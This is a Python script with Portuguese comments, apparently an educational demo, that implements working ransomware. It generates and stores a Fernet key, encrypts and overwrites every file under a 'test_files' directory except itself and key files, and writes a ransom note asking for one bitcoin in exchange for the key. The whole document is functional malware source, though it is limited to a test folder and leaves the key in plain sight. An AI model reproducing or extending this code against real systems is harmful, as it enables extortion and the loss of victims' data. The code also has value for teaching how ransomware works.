from cryptography.fernet import Fernet #importa o módulo de criptografia
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave(): #define a função
    chave = Fernet.generate_key() #gera uma chave aleatória

    with open('chave.key', 'wb') as chave_file: #abre ou cria um arquivo chamado chave.key e escreve a chave em binário. O with garante que o arquivo será fechado automaticamente
        chave_file.write(chave) #ecreve a chave gerada dentro do arquivo chave_file

#2. Carregar a chave salva
def carregar_chave(): #define o nome da função
    return open('chave.key', 'rb').read() #abre o arquivo chave.key, faz a leitura em binário e retorna o conteúdo para uso no código

#3 Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave): #Cria uma função para criptografar um arquivo.
    f = Fernet(chave) #Prepara a chave de criptografia.

    with open(arquivo, 'rb') as file: #Abre o arquivo para leitura.
        dados = file.read() #Lê o conteúdo do arquivo.
        dados_encriptados = f.encrypt(dados) #Criptografa os dados.

        with open(arquivo, 'wb') as file: #Abre o arquivo para escrever os dados novos.
            file.write(dados_encriptados) #Salva o arquivo criptografado.

#4 Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio): #Cria uma função para procurar arquivos em uma pasta.
    lista = [] #Cria uma lista vazia para guardar os arquivos encontrados.

    for raiz, _, arquivos in os.walk(diretorio): #Percorre todas as pastas e arquivos do diretório.
        for nome in arquivos: #Passa por cada arquivo encontrado.
            caminho = os.path.join(raiz, nome) #Monta o caminho completo do arquivo.

            if nome != 'app.py' and not nome.endswith('.key'): #Ignora o arquivo ransomware.py e arquivos que terminam com .key
                lista.append(caminho) #Adiciona o arquivo na lista.

    return lista #Retorna a lista com os arquivos encontrados.

#5 Mensagem de resgate
def criar_mensagem_resgate():
    with open('LEIA ISSO.txt', 'w') as f:
        f.write('Seus arquivos foram criptografados"!\n')
        f.write('Envie 1 bitcoin para o endereço x e envie o comprovante')
        f.write('Após isso, enviaremos a chave para você recuperar os seus dados.')

#6 execução principal do código
def main(): #Cria a função principal do programa.
    gerar_chave() #Gera uma chave de criptografia.
    chave = carregar_chave() #Carrega a chave salva.
    arquivos = encontrar_arquivos('test_files') #Procura arquivos dentro da pasta TestFiles.

    for arquivo in arquivos: #Passa por cada arquivo encontrado.
        criptografar_arquivo(arquivo, chave) #Criptografa cada arquivo usando a chave.

    criar_mensagem_resgate() #Cria a mensagem de resgate do ransomware.

    print('Ransomware executado! Arquivos criptografados!') #Mostra uma mensagem dizendo que os arquivos foram criptografados.

if __name__ == '__main__': #Verifica se o arquivo foi executado diretamente.
    main() #Executa a função principal.
